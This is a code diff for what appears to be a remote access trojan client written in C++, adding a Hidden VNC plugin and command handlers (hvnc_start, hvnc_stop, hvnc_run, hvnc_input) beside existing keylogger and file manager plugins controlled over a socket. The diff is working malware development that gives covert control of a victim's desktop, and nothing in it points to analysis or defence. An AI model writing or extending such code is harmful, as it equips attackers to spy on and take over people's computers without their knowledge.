@@ -48,6 +48,7 @@ private:
     const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
+    const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -121,6 +122,14 @@ private:
         }
     }
 
+    void execute_hvnc_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(HIDDEN_VNC_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(HIDDEN_VNC_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(HIDDEN_VNC_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -154,6 +163,9 @@ private:
                      action == "copyfile" || action == "pastefile" || action == "downloadfile" ||
                      action == "uploadfile") {
                 execute_file_manager_command(data);
+            }
+            else if (action == "hvnc_start" || action == "hvnc_stop" || action == "hvnc_run" || action == "hvnc_input") {
+                execute_hvnc_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -253,6 +265,13 @@ private:
                                         pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     } else {
                                         pluginMgr.executePlugin(FILE_MANAGER_PLUGIN_ID, "RunPlugin", sock);
+                                    }
+                                } else if (pluginId == HIDDEN_VNC_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(HIDDEN_VNC_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        // HVNC doesn't have RunPlugin, but we'll call HandleCommand with empty data if needed
+                                        // or just wait for next command.
                                     }
                                 }
                             }
